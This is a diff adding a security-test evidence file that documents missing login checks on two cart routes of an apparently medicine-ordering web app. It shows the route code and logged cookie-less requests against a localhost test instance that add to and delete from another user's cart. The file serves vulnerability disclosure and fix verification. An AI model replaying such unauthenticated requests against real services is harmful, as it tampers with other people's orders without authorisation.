@@ -1,0 +1,50 @@
+V-12 Two of the three cart routes have no login check
+=====================================================
+
+state    : BEFORE the fix
+captured : 2026-09-24T17:41:47.965Z
+branch   : test/it22083500/v11-v15-before-evidence
+commit   : ec2853c
+tool     : Node.js v22.20.0 fetch() — requests sent by security-tests/capture-v11-v15.mjs
+           (the same attacks with the real curl binary: before-curl.txt in this folder)
+target   : http://localhost:4000  (disposable in-memory database, localhost only)
+
+------------------------------------------------------------------------------
+WHAT THIS PROVES
+  The login middleware is imported in UserCart.routes.js but applied to only one
+  of its three routes. Adding to and deleting from any cart needs no login at all.
+
+METHOD: black box — requests with NO cookie, then confirm with the victim's own view
+
+THE ROUTE FILE
+  backend/src/routes/UserCart.routes.js:11:  router.post("/add-to-cart", ToggleCart);
+  backend/src/routes/UserCart.routes.js:12:  router.delete("/delete-from-cart/:id", deleteFromCart);
+  backend/src/routes/UserCart.routes.js:13:  router.get("/user-cart/:userId", isPatientAuthenticated, getUserCart);
+
+CONTROL — the one guarded route, no cookie
+> fetch GET $BASE/api/v1/medicines-cart/user-cart/6ab560a539b92768520592ba [no cookie]
+  HTTP 401
+  {"success":false,"message":"Unauthorized Access!"}
+
+ATTACK 1 — write into Bobby's cart, no cookie
+> fetch POST $BASE/api/v1/medicines-cart/add-to-cart [no cookie]
+  body: {"userId":"6ab560a539b92768520592ba","medicineId":"6ab560a539b92768520592c9","quantity":5,"totalPrice":500,"status":"Pending"}
+  HTTP 201
+  {"statusCode":201,"data":{"userId":"6ab560a539b92768520592ba","medicineId":"6ab560a539b92768520592c9","quantity":5,"totalPrice":500,"status":"Pending","_id":"6ab560db39b92768520594ca","createdAt":"2026-09-24T17:41:47.919Z","updatedAt":"2026-09-24T17:41:47.919Z","__v":0},"message":"Medicine Added to Cart Successfully!"}
+
+ATTACK 2 — delete Bobby's seeded cart row, no cookie
+> fetch DELETE $BASE/api/v1/medicines-cart/delete-from-cart/6ab560a539b92768520594bd [no cookie]
+  HTTP 200
+  {"statusCode":200,"data":{},"message":"Medicine Deleted from Cart Successfully!"}
+
+CONFIRM — Bobby logs in and looks at his own cart
+> fetch GET $BASE/api/v1/medicines-cart/user-cart/6ab560a539b92768520592ba [with bobby's session cookie]
+  HTTP 200
+  {"statusCode":200,"data":[{"_id":"6ab560db39b92768520594ca","userId":"6ab560a539b92768520592ba","medicineId":"6ab560a539b92768520592c9","quantity":5,"totalPrice":500,"status":"Pending","createdAt":"2026-09-24T17:41:47.919Z","updatedAt":"2026-09-24T17:41:47.919Z","__v":0}],"message":"Cart Fetched Successfully!"}
+
+  RESULT: row planted by an anonymous request present : YES
+          seeded row 6ab560a539b92768520594bd deleted anonymously : YES
+
+TOOLING NOTE
+  Semgrep and njsscan do not flag this — nothing in the code *text* is wrong; the
+  bug is a middleware that is missing. Found by reading the route file, proven with live requests.
